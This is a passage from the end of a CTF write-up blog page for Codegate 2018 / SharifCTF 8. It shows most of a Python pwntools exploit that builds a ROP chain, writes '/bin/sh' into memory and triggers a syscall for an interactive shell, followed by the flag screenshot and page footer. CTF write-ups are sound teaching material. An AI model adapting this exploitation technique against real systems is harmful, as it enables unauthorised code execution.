        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">read_plt</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"rules...:( </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x3b</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">pwn_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">start_binary</span><span class="p">()</span>

        <span class="n">syscall_addr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">write_addr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">],</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xe</span>
        <span class="k">print</span> <span class="s">"[*] Find syscall gadget at:"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">read_addr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">".data"</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span><span class="p">,</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
        <span class="k">print</span> <span class="s">"[*] Write string </span><span class="se">\"</span><span class="s">/bin/sh</span><span class="se">\x00\"</span><span class="s"> at:"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">".data"</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">execute_syscall</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">pwn</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">pwn_binary</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>Let’s try it:</p>

<p><img src="/assets/media/codegate_2k18_flag.png" alt="Binary pwn" /></p>

<p>Done.</p>

<p>You can find the binary and the exploit <a href="https://github.com/meffre-q/ctf/tree/master/codegate_quals_2k18/pwn">here</a>.</p>

<p>Thanks to Sharif/Codegate for this great challenges! :)</p>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#write-up-ref">
					write-up <span>(5)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#pwn-ref">
					pwn <span>(10)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[Write-Up] Codegate 2018 preliminary CTF / SharifCTF 8&via=0xdagger"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
        <h4 class="section-title author-name">Quentin Meffre</h4>
        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/write-up/2018/01/23/write_up_sec_it.html" title="[Write-Up] SEC-IT Bad-Auth Challenge">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/write-up/2018/03/04/write_up_pragyan.html" title="[Write-Up] Pragyan CTF - Old school hack">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2018 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-90952644-1', 'auto');
  ga('send', 'pageview');
</script>

